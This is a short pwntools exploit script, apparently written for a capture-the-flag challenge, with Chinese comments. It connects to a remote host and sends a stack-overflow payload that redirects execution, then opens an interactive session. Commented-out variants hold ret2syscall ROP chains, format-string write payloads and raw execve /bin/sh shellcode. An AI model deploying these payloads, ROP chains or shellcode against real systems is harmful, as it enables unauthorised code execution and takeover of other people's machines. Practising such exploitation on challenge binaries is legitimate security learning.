from pwn import *

# context(os='linux', arch='amd64', endian='little', log_level='debug')

# io = process('./pwn')  # 打开本地程序
ip, port = '101.200.77.68:35175'.split(':')
io = remote(ip, int(port))
# elf = ELF('C:/Users/Lenovo/Downloads/pwn')
# system_addr = elf.symbols['system']

# 栈溢出漏洞
payload = b'1' * (0x68 + 0x4) + p32(0x8048994)
# payload = b'1'*0x28  + p64(pop_rdi) + p64(binsh)+ p64(sys)

# ret2syscall
# payload = b'A' * 112 + pop_eax_ret + p32(0xb) + pop_other_ret + p32(0) + p32(0) + bin_add + int_add
# payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

# 格式化字符串漏洞
# io.sendline(b'3333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x')
# payload = b'a'*85 + b'%20$n' + b'a'*6 + p64(0x80EBF9C)
# payload = fmtstr_payload(4, {0x80ebf9c:28}, 0, write_size = 'byte')

# io.recvuntil(b"leave your message please:")
io.sendline(payload)

# io.sendlineafter(b'Input:', payload)
# v3_addr = io.recvuntil("\n")[:]

# shellcode = b"\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"
# shellcode = asm(shellcraft.sh())
# io.send(shellcode)

io.interactive()

io.close()
